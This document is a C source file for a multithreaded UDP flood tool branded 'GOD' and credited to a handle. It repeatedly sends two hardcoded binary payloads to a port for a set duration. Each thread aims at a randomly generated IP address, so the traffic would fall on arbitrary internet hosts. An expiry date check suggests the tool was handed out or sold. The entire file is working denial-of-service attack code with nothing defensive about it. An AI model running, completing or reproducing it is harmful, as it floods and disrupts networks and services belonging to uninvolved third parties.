#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define MAX_PAYLOADS 2 // Define a limit for payloads
#define IP_LENGTH 16   // Define IP string length

// Function to display correct usage
void usage() {
    printf("Usage: ./GOD <PORT> <TIME> <THREADS>\n");
    exit(1);
}

struct thread_data {
    char ip[IP_LENGTH];
    int port;
    int duration;
};

// Generate a random IP address
void generate_random_ip(char *ip) {
    snprintf(ip, IP_LENGTH, "%d.%d.%d.%d",
             rand() % 256,
             rand() % 256,
             rand() % 256,
             rand() % 256);
}

// Worker function executed by each thread
void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    const char *payloads[MAX_PAYLOADS] = {
        "\x0d\x16\x06\x14\xa3\x2d\x2b\xa6\x5e\xb1\xf9\x9a\xcf\x1f\xe5\x05\x00\x06\x10\x74\xf5\x45\x6b\x7e\x7b\xd6\xb4\x46\x6e\xf5\xa5\x1f\x4d\xc0\xe7\xbb\x3b\x61\x5a\xc0\xc5\x30\xa4\x05\x1b\x71\x86\xf2\xe2\x69\x47\xf0\x84\x67\x2f\xe5\x0b\xd6\xcd\xaf\x30\x23\xe6\xd8\xbf\x57\xa0\x1e\xbf\x93\xef\x75\xf3\x71\xd5\xf7\x3c\x94\xd8\x57\x0c\xc0\x2f\x30\x1c\xea\x63\xa6\x5a\xc7\x9b\x59\x26\x08\xbf\x08\x48\x8f\x9d\x40",
        "\xc2\x9c\xa1\x6d\xae\x4d\x5a\x63\x47\x2a\xbf\xd0\x6d\x32\x55\x64\x27\x8f\xc1\x79\xc7\xa2\x67\xc5\x0a\x54\x54\xe4\x99\x2d\x80\x4b\x67\xf4\xff\xb0\x65\x5e\xc9\x87\x88\x61\x55\x99\xc9\x7f\x53\x3d\x15\x9c\x5c\x47\xe4\xc7\x29\x7a\xb1\x2c\xeb\x58\x3c\x62\xf1\xf7\x19\x04\x2f\xb1\xd9\x51\xf3\x4b\x3d\xc3\x65\xbc\xdf\xb4\xe1\x59\xbc\x56\x4d\x7f\x31\x41\x69\x7c\xf8\x95\x0c\x98\x50\x3e\xa8\x38\xf0\xdd\x99\x87\x9f\xf8\x22\xa0\x5b\x8d\x63\x4d\x0c\x6b\xb6\xba\xd5\x52\x3d\x82\x7d\x00\x22\xa4\xfb\x20\xea\x23\x67\x4d\x51\xc1\xc1\x13\xdd\xdd\x3f\x15\x99\xed\xa8\x3d\x33\x09\x04\xdb\xe8\xff"
    };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->duration;

    printf("Thread targeting IP: %s\n", data->ip);

    while (time(NULL) <= endtime) {
        for (int i = 0; i < MAX_PAYLOADS; i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        usage();
    }

    int port = atoi(argv[1]);
    int duration = atoi(argv[2]);
    int threads = atoi(argv[3]);

    // Validate input parameters
    if (port <= 0 || port > 65535 || duration <= 0 || threads <= 0) {
        fprintf(stderr, "Invalid input: port must be 1-65535, duration and threads must be positive integers.\n");
        exit(1);
    }

    // Expiration time (e.g., January 31, 2025, 23:59:59)
    struct tm expiration_tm = {0};
    expiration_tm.tm_year = 2025 - 1900;
    expiration_tm.tm_mon = 0; // January
    expiration_tm.tm_mday = 31;
    expiration_tm.tm_hour = 23;
    expiration_tm.tm_min = 59;
    expiration_tm.tm_sec = 59;

    time_t expiration_time = mktime(&expiration_tm);

    if (expiration_time == -1) {
        perror("Error calculating expiration time");
        exit(1);
    }

    if (time(NULL) >= expiration_time) {
        printf("The program has expired. Exiting.\n");
        return 0;
    }

    srand(time(NULL)); // Initialize random seed

    printf("Flood started on port %d for %d seconds with %d threads\n", port, duration, threads);

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    if (thread_ids == NULL) {
        perror("Memory allocation failed for thread IDs");
        exit(1);
    }

    struct thread_data *thread_data_array = malloc(threads * sizeof(struct thread_data));
    if (thread_data_array == NULL) {
        perror("Memory allocation failed for thread data");
        free(thread_ids);
        exit(1);
    }

    for (int i = 0; i < threads; i++) {
        // Generate thread-specific data
        generate_random_ip(thread_data_array[i].ip);
        thread_data_array[i].port = port;
        thread_data_array[i].duration = duration;

        // Launch thread
        if (pthread_create(&thread_ids[i], NULL, attack, &thread_data_array[i]) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            free(thread_data_array);
            exit(1);
        }

        printf("Launched thread %d targeting IP: %s\n", i + 1, thread_data_array[i].ip);
    }

    // Wait for all threads to complete
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    // Clean up allocated resources
    free(thread_ids);
    free(thread_data_array);

    printf("Attack finished. Made By @username\n");
    return 0;
}
